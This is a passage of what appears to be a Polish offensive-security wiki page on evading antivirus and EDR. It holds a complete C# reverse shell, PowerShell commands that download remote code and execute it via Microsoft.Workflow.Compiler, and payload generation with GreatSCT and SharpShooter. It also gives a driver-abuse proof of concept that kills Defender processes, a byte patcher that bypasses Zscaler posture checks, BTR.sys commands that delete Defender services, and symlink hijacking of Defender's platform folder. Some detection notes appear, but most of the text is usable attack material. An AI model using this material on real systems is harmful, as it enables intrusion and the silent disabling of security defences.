- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [wyskakujące okno](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby wyświetlić pomoc, bo wywołasz [wyskakujące okno](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj payload XML** przy użyciu:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# z użyciem kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Używanie Pythona do budowania injectorów — przykład:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z poziomu jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny, podatny na ataki, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji jądra, których nie mogą zablokować nawet usługi AV działające jako Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze informacje
1. **Podpisany sterownik**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale binarnie jest to legalnie podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma prawidłowy podpis Microsoft, zostaje załadowany nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia w trybie użytkownika; kod wykonywany w kernelu może otwierać *chronione* procesy, kończyć je lub manipulować obiektami kernela niezależnie od PPL/PP, ELAM czy innych funkcji hardeningu.

Wykrywanie / ograniczanie ryzyka
• Włącz listę blokowanych podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby system Windows nie ładował `AToolsKrnl64.sys`.
• Monitoruj tworzenie nowych usług *kernela* i generuj alerty, gdy sterownik jest ładowany z katalogu z prawem zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
• Monitoruj uchwyty z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez modyfikowanie binariów na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite obejście zabezpieczeń:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (do serwera wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC sprawdzają jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **modyfikację czterech podpisanych binariów na dysku** można zneutralizować oba mechanizmy:

| Binarium | Zmieniana oryginalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Minimalny fragment patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wskazują **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zhakowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej określonej przez zasady Zscaler.

To studium przypadku pokazuje, jak za pomocą kilku poprawek bajtowych można obejść decyzje o zaufaniu podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisów.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik Defendera **Boot-Time Removal** stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny komponent naprawczy podpisany przez Microsoft, pozbawiony błędu korupcji pamięci i interfejsu IOCTL; po uzyskaniu dostępu administratora i uprawnienia `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą i uzyskać zamierzone operacje na plikach/rejestrze w Ring-0. Jest to **prymitywna metoda neutralizacji AV/EDR po przejęciu systemu, a nie metoda uzyskania początkowego dostępu ani eskalacji uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w pliku `MpEngine.dll` samego celu, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie sterownika jednorazowego użytku

Defender zazwyczaj zapisuje zasób jako plik `[a-z]{8}.sys` o losowej nazwie i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany alternatywny strumień danych NTFS (ADS), odszyfrowuje i weryfikuje listę działań, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany zamiast pozostać załadowanym. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden blob zaszyfrowany RC4. Analizowane kompilacje używają ponownie stałego klucza 256-bajtowego, więc szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy tekst jawny ma 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona znakiem null ścieżka feedback w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, kończące się **dokładnie czterema bajtami NUL**. Każdy obszar nagłówka/danych jest weryfikowany niezależnie za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego obszaru.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usunięcie pliku, także zablokowanego |
| 2 | `[ścieżka UTF-16]` | Usunięcie pustego katalogu |
| 3 | `[Flagi][źródło][miejsce docelowe]` | Przeniesienie pliku do chronionej ścieżki wybranej przez atakującego; puste miejsce docelowe oznacza usunięcie |
| 4 | `[Flagi][ścieżka klucza]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flagi][ścieżka klucza + "\\" + wartość]` | Usunięcie wartości rejestru |
| 6 | `[Flagi][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Utworzenie/aktualizacja wartości rejestru i utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separator klucza/wartości w formacie wire to **dwa następujące po sobie ukośniki odwrotne**; ścieżka sformatowana zgodnie z konwencją nie zostanie prawidłowo podzielona. Plik feedback w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flag, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przebieg działania `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy strumień `:changelist` w pliku `<losowy>.sys` oraz strumień feedback, serializuje/sumuje kontrolnie/szyfruje łańcuch akcji, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` albo pozostawia sterownik jako sterownik uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie wpisu w rejestrze omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie powoduje** wygenerowania zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty uruchamiane przy rozruchu można później usunąć za pomocą `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie nadaje się do użycia, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i dowiązanie `SystemRoot` będą gotowe. `Start=1` w połączeniu z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w Phase 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych na poziomie systemu oraz usług EDR działających w trybie użytkownika nie zostało jeszcze zainicjalizowanych. Filtry uruchamiane podczas rozruchu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usług przed następnym uruchomieniem, a także usunąć pliki wykonywalne usług, zanim SCM je uruchomi. ELAM nie eliminuje tej luki, ponieważ BTR działa po ocenie sterowników uruchamianych podczas rozruchu i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań wykonuje się w ramach jednej transakcji. PoC dodaje na początku Action 1 dla zakodowanej na stałe ścieżki `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten plik dziennika, a następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość dowodów, a umieszczenie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje detekcji o wysokiej wartości sygnału

Reguły oparte wyłącznie na podpisach oraz lista zablokowanych podatnych sterowników Microsoftu nie zapobiegają nadużywaniu zamierzonych funkcji BTR. Preferuj poniższe korelacje behawioralne, rozróżniając przy tym legalny rodowód Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` występuje zawsze podczas przygotowywania BTR. Strumień ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ legalny Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR spoza rodowodu Defendera z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie jeśli dotyczy plików binarnych związanych z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alert w przypadku szybkiego utworzenia i usunięcia `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ograniczaj i audytuj nadawanie/włączanie uprawnienia `SeLoadDriverPrivilege`; sam podpis Microsoftu nie gwarantuje zaufania, gdy sterownik narzędzia zabezpieczającego jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię sygnatariuszy/poziomów, tak aby procesy chronione mogły ingerować w siebie nawzajem tylko wtedy, gdy mają taki sam lub wyższy poziom ochrony. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny obsługujący PPL i kontrolować jego argumenty, możesz wykorzystać nieszkodliwą funkcję (np. rejestrowanie) jako ograniczony, oparty na PPL prymityw zapisu do chronionych katalogów używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany przy użyciu EKU obsługującego PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, który odpowiada sygnatariuszowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla sygnatariuszy anti-malware, `PROTECTION_LEVEL_WINDOWS` dla sygnatariuszy Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Podpisany plik binarny systemu `C:\Windows\System32\ClipUp.exe` uruchamia własny proces i przyjmuje parametr wskazujący ścieżkę, pod którą ma zapisać plik dziennika.
- Uruchomiony jako proces PPL zapisuje plik z uprawnieniami PPL.
- ClipUp nie obsługuje ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Narzędzia do obsługi krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w zarysie)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z `CREATE_PROTECTED_PROCESS` za pomocą launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki pliku dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV normalnie otwiera/blokuje plik docelowy podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Sprawdź kolejność rozruchu za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL następuje, zanim AV zablokuje swoje pliki binarne, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki zredagowano/skrócono ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie możesz kontrolować zawartości zapisywanej przez ClipUp — możesz określić jedynie jej położenie; ta prymitywna technika nadaje się do uszkadzania, a nie precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi oraz zaplanowania ponownego uruchomienia wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe jest wyczucie czasu: docelowy plik nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jego procesem nadrzędnym są niestandardowe programy uruchamiające, w okolicy rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych, które regularnie uruchamiają się przed Defender/AV. Sprawdzaj tworzenie/modyfikowanie usług przed awariami uruchamiania Defendera.
- Monitorowanie integralności plików binarnych/katalogów Platform Defendera; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami procesu chronionego.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` i nietypowego użycia poziomu PPL przez pliki binarne niezwiązane z AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w ramach jakich procesów nadrzędnych; blokuj wywoływanie ClipUp poza prawidłowymi kontekstami.
- Higiena usług: ograniczaj tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością uruchamiania.
- Upewnij się, że włączono ochronę przed manipulacją Defendera i zabezpieczenia wczesnego uruchamiania; sprawdzaj błędy rozruchu wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających narzędzia bezpieczeństwa, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Manipulowanie Microsoft Defender przez przejęcie dowiązania symbolicznego do folderu wersji Platform

Windows Defender wybiera platformę, z której działa, wyliczając podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defendera (odpowiednio aktualizując ścieżki usługi/rejestru). Ten wybór uwzględnia wpisy katalogów, w tym punkty ponownej analizy katalogów (dowiązania symboliczne). Administrator może wykorzystać tę właściwość, aby przekierować Defendera do ścieżki z możliwością zapisu przez atakującego i doprowadzić do DLL sideloading lub zakłócenia działania usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Wymagania wstępne
- Lokalny Administrator (wymagany do tworzenia katalogów/dowiązań symbolicznych w folderze Platform)
- Możliwość ponownego uruchomienia komputera lub wywołania ponownego wyboru platformy przez Defendera (ponowne uruchomienie usługi podczas rozruchu)
- Wymagane są tylko wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy we własnych folderach, ale wybór platformy uwzględnia wpisy katalogów i wybiera leksykograficznie najwyższą wersję, nie sprawdzając, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Instrukcja krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform symlink katalogu o wyższej wersji, wskazujący na Twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór triggera (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) działa ze ścieżki przekierowanej:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestr odzwierciedlające tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść lub podmień pliki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie mogła zostać rozwiązana, a Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing z użyciem PIC (w stylu Crystal Kit)

Zespoły red team mogą przenieść runtime evasion z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego kod niezależny od pozycji (PIC). Pozwala to uogólnić evasion poza niewielki zestaw API udostępnianych przez wiele kitów (np. CreateProcessA) i zapewnić te same zabezpieczenia dla BOF-ów oraz bibliotek DLL używanych po eksploatacji.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście ogólne
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (przed modułem lub jako plik towarzyszący). PIC musi być samowystarczalny i niezależny od pozycji.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmodyfikuj wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na lekkie wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed wywołaniem właściwego adresu API. Typowe techniki evasion obejmują:
